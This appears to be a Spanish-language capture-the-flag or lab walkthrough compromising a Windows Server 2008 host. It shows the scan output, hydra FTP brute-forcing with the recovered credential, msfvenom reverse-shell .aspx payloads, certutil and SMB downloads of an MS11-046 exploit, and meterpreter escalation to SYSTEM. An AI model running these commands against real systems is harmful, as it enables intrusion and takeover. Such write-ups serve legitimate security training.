PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft IIS httpd 7.0
445/tcp   open  microsoft-ds?

-Entramos al puerto 80 y nos encontramos un servidor Apache Default, hacemos fuzzing pero no encontramos nada

-Intentamos enumerar smb con crackmapexec y smbclient pero no tenemos permisos

-Hacemos fuerza bruta a FTP con hydra, probamos con una lista de usuarios y otra de contraseñas:
	-hydra ftp://192.168.1.134 -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/SecLists/Passwords/xato-net-10-million-passwords.txt -f -V 
		**login: info   password: PolniyPizdec0211**

**-IMPORTANTE --> -f:** Se usa para que el ataque termine cuando se encuentre una credencial válida, sino va a seguir y puede ser que no te des cuenta de que ha encontrado algo.

-Nos autenticamos en FTP con las credenciales obtenidas:
	ftp 192.168.1.134
	password: PolniyPizdec0211

-Listamos el contenido y vemos que tenemos acceso a los archivos del servidor web!!

-Generamos un Payload .aspx con msfvenom, lo subimos a ftp y lo ejecutamos desde la URL para obtener acceso a la máquina. 
### 2 Maneras

**1-Shell Payload (32 bits system:):**
	-Generamos Payload con msfvenom:
		-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.135 LPORT=4444 -f aspx -o shell.aspx
	-Subimos el Payload a ftp:
		-put shell.aspx
	-Nos ponemos en escucha con Netcat, ejecutamos el archivo desde la URL y recibimos la conexión:
		-nc -lvnp 4444
		c:\windows\system32\inetsrv>

**2-Meterpreter Payload (32 bits system):**
	-Generamos Payload con msfvenom:
		-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.135 LPORT=1234 -f aspx -o shell.aspx
	-Subimos el Payload a ftp:
		-put meterpreter.aspx
	-Nos ponemos en escucha desde Metasploit con el multi/handler, ejecutamos el Payload desde la URL y obtenemos la conexión:
		meterpreter > shell
		c:\windows\system32\inetsrv>

## Escalada de Privilegios

-Listamos la información del sistema:
	c:\Users\info>systeminfo

-Encontramos el nombre y la versión del sistema operativo:
	Nombre del sistema operativo:              Microsoft� Windows Server� 2008 Datacenter 
	Versi�n del sistema operativo:             6.0.6001 Service Pack 1 Compilaci�n 6001

-Buscamos en el navegador --> windows 6.0.6001 privilege escalation
	-Encontramos el siguiente recurso:
		(https://www.exploit-db.com/exploits/40564)
	-Confirmamos que es vulnerable, ya que en sistemas afectados sale la nuestra:
		-Windows Server 2008 Dat SP1 x86 EN [6.0.6001]

-NOTA: El exploit  '(https://www.exploit-db.com/exploits/40564)' no funciona en esta máquina por que ocupa demasiado y no deja ejecutarlo, en su lugar vamos a utilizar el siguiente:
	https://github.com/am0nsec/exploit/blob/master/windows/privs/MS11-046/ms11-046.exe


### 2 Maneras

1-Nos descargamos el exploit desde nuestro servidor Python y lo ejecutamos
	-Nos los descargamos en nuestra máquina local y lo compartimos con un servidor python:
		python -m http.server 80
	-Desde la máquina windows, nos creamos una carpeta y nos descargamos el exploit con certutil:
		-mkdir temp
		-certutil -urlcache -f http://192.168.1.135/ms11-046.exe ms11-046.exe
	-Ejecutamos el exploit y hemos escalado al usuario administrador:
		-c:\temp>ms11-046.exe
		-c:\Windows\System32>whoami
		nt authority\system

2-Iniciamos un servidor con 'impacket-smbserver' y hacemos una petición ejecutando el exploit directamente:
	-Iniciamos el servidor en nuestra máquina local:
		-impacket-smbserver smb .
	-Hacemos la petición desde la máquina windows y ejecutamos el exploit directamente:
		-c:\temp>\\192.168.1.135\smb\ms11-046.exe
		-c:\Windows\System32>whoami
		nt authority\system


NOTA: MUCHO MÁS FÁCIL --> Si obtenemos acceso mediante una sesión de meterpreter, podemos escalar Privilegios con Metasploit de la siguientes maneras:
	1-Comando getsystem (Intenta escalar privilegios con comandos automatizados):
		-meterpreter > getsystem
			...got system via technique 6 (Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)).
		meterpreter > getuid
		Server username: NT AUTHORITY\SYSTEM 
		-Hemos escalado al usuario Administrador con un solo comando!!!
	2-Usando Módulo multi/recon/local_exploit_suggester
		-Ponemos la session de meterpreter en el background y usamos el módulo del título
			-use multi/recon/local_exploit_suggester
			-set session 1 (Especificamos la session de meterpreter que pusimos en el background)
			-run 
			1   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move                 
			 2   exploit/windows/local/ms10_015_kitrap0d                        
			-Podemos escalar Privilegios usando cualquiera de los siguientes módulos!!:
				-Probamos con el 2:
					-use exploit/windows/local/ms10_015_kitrap0d   
					-set session 1
					-run
						meterpreter > getuid
						Server username: NT AUTHORITY\SYSTEM

